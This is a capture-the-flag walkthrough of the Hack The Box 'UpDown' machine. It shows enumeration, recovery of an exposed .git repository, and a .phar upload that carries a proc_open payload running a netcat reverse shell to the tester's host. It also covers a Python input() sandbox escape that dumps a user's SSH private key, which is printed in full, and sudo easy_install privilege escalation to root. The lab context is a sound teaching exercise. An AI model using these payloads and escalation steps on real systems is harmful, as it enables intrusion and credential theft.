![image](https://user-images.githubusercontent.com/105310322/191848802-6425b2c6-cc62-412a-9f6f-9a9e97497148.png)

### Tools: gobuster, feroxbuster, git, php

### Vulnerabilities: Proc_open() Reverse Shell file upload, Python sandbox escape, sudo

Nmap gives us a webpage and ssh back.

```console
└──╼ [★]$ sudo nmap -A -p- -T4 -Pn 10.129.58.170
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-21 21:19 BST
Nmap scan report for 10.129.58.170
Host is up (0.0059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/21%OT=22%CT=1%CU=41673%PV=Y%DS=2%DC=T%G=Y%TM=632B735
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT     ADDRESS
1   6.77 ms 10.10.14.1
2   8.53 ms 10.129.58.170

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 403.74 seconds
```

The site simply checks if a site is up or down but it does give us its domain. ```siteisup.htb``` So we can add this to our /etc/hosts and perform a gobuster on it.

![image](https://user-images.githubusercontent.com/105310322/191851461-2bb45d0b-4913-4c68-985d-6a5c994ce217.png)


Since it's a webpage lets check for subdirectories and other domains.

Gobuster finds another domain but we do not have access to it.

```console
└──╼ [★]$ gobuster vhost -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t30 -q
Found: dev.siteisup.htb (Status: 403) [Size: 281]
```

Using feroxbuster (feroxbuster has recursion by default so it can look deeper unlike gobuster) We get a hit on /dev/.git.

Lets check if there is anything hiding inside.


```console
└──╼ [★]$ feroxbuster -q -u http://siteisup.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git
301        9l       28w      310c http://siteisup.htb/dev
200       40l       93w     1131c http://siteisup.htb/index.php
200        0l        0w        0c http://siteisup.htb/dev/index.php
403        9l       28w      277c http://siteisup.htb/server-status
200       40l       93w     1131c http://siteisup.htb/
403        9l       28w      277c http://siteisup.htb/.php
403        9l       28w      277c http://siteisup.htb/.html
200        0l        0w        0c http://siteisup.htb/dev/
403        9l       28w      277c http://siteisup.htb/dev/.php
403        9l       28w      277c http://siteisup.htb/dev/.html
301        9l       28w      315c http://siteisup.htb/dev/.git
301        9l       28w      323c http://siteisup.htb/dev/.git/objects
301        9l       28w      320c http://siteisup.htb/dev/.git/logs
200       13l       35w      298c http://siteisup.htb/dev/.git/config
301        9l       28w      320c http://siteisup.htb/dev/.git/info
301        9l       28w      328c http://siteisup.htb/dev/.git/objects/info
200        3l       17w      521c http://siteisup.htb/dev/.git/index
301        9l       28w      321c http://siteisup.htb/dev/.git/hooks
200        6l       43w      240c http://siteisup.htb/dev/.git/info/exclude
200       17l       71w     1143c http://siteisup.htb/dev/.git/logs/
403        9l       28w      277c http://siteisup.htb/dev/.git/logs/.php
403        9l       28w      277c http://siteisup.htb/dev/.git/logs/.html
200       26l      172w     2884c http://siteisup.htb/dev/.git/
403        9l       28w      277c http://siteisup.htb/dev/.git/.php
403        9l       28w      277c http://siteisup.htb/dev/.git/.html
200       17l       71w     1150c http://siteisup.htb/dev/.git/objects/
403        9l       28w      277c http://siteisup.htb/dev/.git/objects/.php
403        9l       28w      277c http://siteisup.htb/dev/.git/objects/.html
301        9l       28w      324c http://siteisup.htb/dev/.git/branches
200       16l       60w      959c http://siteisup.htb/dev/.git/info/
200       28l      185w     3625c http://siteisup.htb/dev/.git/hooks/
403        9l       28w      277c http://siteisup.htb/dev/.git/hooks/.php
403        9l       28w      277c http://siteisup.htb/dev/.git/hooks/.html
```


Download all of the files .git has to offer.

```console
└──╼ [★]$ wget -r http://siteisup.htb/dev/.git/
```


Note: Before dealing with .git files be sure to run the commands in the parent directory. In this case mine was /siteisup.htb/dev/

We get a couple of different files that seem interesting.

```console
└──╼ [★]$ git ls-files --stage
100644 b317ab51e331425e460e974903462a3dcdccc878 0	.htaccess
100644 940a3179aa882a0b1ac3ff665797818e9aa68a0c 0	admin.php
100644 09e4ccd27f706d9f848cc13581699fdab694ff82 0	changelog.txt
100644 20a2b359105529ee120796c446ff68e6d8a46bfe 0	checker.php
100644 32eeeee1c38e7a3d5766f6919c34843dadaa53b5 0	index.php
100644 3b6b838805812d0b0690699f244aeced9709b5b6 0	stylesheet.css
```

And git log gives us a hint about a header to protect their dev.siteisup.htb site.

```console
└──╼ [★]$ git log
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.
    
```

Checking the git file in the logs against the up to date file it gives us the special header ```Special-Dev: only4dev```

Using this header we can finally access the dev site.

```console
└──╼ [★]$ git diff 8812785e31c879261050e72e20f298ae8c43b565 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
diff --git a/.htaccess b/.htaccess
index b317ab5..44ff240 100644
--- a/.htaccess
+++ b/.htaccess
@@ -2,4 +2,3 @@ SetEnvIfNoCase Special-Dev "only4dev" Required-Header
 Order Deny,Allow
 Deny from All
 Allow from env=Required-Header
```


Next we are going to fire up burpsuite and navigate to dev.siteisup.htb

After burpsuite grabs the page be sure to add in the header anywhere in the field

```
GET / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Special-Dev: only4dev
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

Doing so gives us a similar webpage but this time we can upload a file. This part turned out to not be so simple and requires looking at the other .git files.

![image](https://user-images.githubusercontent.com/105310322/191851887-f432a5ed-bb67-426a-9a17-cb10c62df2c5.png)


If we look into the checker.php it is actually shows the extensions that are excluded. A bunch of them are not allowed except for .phar files. It also states that are files are located in /uploads.

Now every time we upload files the script is deleting the uploaded file after it is read.

```php
└──╼ [★]$ git cat-file -p 20a2b359105529ee120796c446ff68e6d8a46bfe
<?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url));
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
  
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
  # Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	
  # Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```


There was one last thing I was missing to figure out why my reverse shell was not working and that was the proc_open() functions in php.
By creating another payload and sending it to dev.siteisup.htb we are able to print all of the php info.

This link gives a simple explanation how it works.
https://www.php.net/manual/en/function.phpinfo.php

Note: Be sure to add a bunch of websites to the beginning of this payload too.

```php
<?php 
phpinfo();
```
Using that script prints alot and in the disable functions section we can see that most are blocked including fsockopen but not proc_open()

![image](https://user-images.githubusercontent.com/105310322/191994679-3a4bcb80-822b-4501-8443-718edd7e283e.png)

The link below gives the script and all you have to do is put in your reverse shell and change in the proc_open() section php to sh.

https://www.php.net/manual/en/function.proc-open.php



Now we can take everything that checker.php is checking for and form our payload.


1. I Added lots of websites to look at so I would have more time to navigate to the file upload since it gets deleted very quickly. 
2. Create it as a .phar file
3. Use a proc_open script with your reverse shell.
4. Make sure your burp suite is ready to go with ```Special-Dev: only4dev``` (In burpsuite community you will have to input this every time you load a page)
5. Alternatively you can run this Curl command from another user ```curl -H 'Special-Dev: only4dev' -s http://dev.siteisup.htb/uploads/ | grep "\[DIR\]" | cut -d "\"" -f 8 > folder-names; while read -r line; do curl -v -H 'Special-Dev: only4dev' "http://dev.siteisup.htb/uploads/${line}<PHAR-FILE-NAME>.phar"; done < folder-names``` and it should work but I have not tested.



```php
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb
http://siteisdown.htb



<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.83 1234 >/tmp/f");
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.227.227.
Ncat: Connection from 10.129.227.227:33780.
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /tmp
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@updown:/tmp$ 
```

The files inside /home/developer look interesting

```console
www-data@updown:/tmp$ ls -la /home/developer/dev
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py

```

This file siteisup_test.py is actually vulnerable to a python sandbox escape, more info is linked below. Also the binary ./siteisup will call on this file.

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes


```console
www-data@updown:/home/developer/dev$ cat siteisup_test.py
cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

So very simply all we have to do is abuse the import module for command execution on the system.


```console
www-data@updown:/home/developer/dev$ ./siteisup
./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('cat /home/developer/.ssh/id_rsa')
```
Just like that we get the users key :)

```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

This next part is even easier and a bit underwhelming.

Running sudo -l shows we have sudo rights for easy_install.


```console
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```


If we go and check out easy_install on GTFObins we get a quick sudo command for PE

https://gtfobins.github.io/gtfobins/easy_install/

Input the command and we have root!

```console
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.SizFBjbMBL
Writing /tmp/tmp.SizFBjbMBL/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.SizFBjbMBL/egg-dist-tmp-CEKvME
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
Cat the flags and we are done!

```console
# cat user.txt
673b7***************************
# cat /root/root.txt
f2072***************************
```

GG!
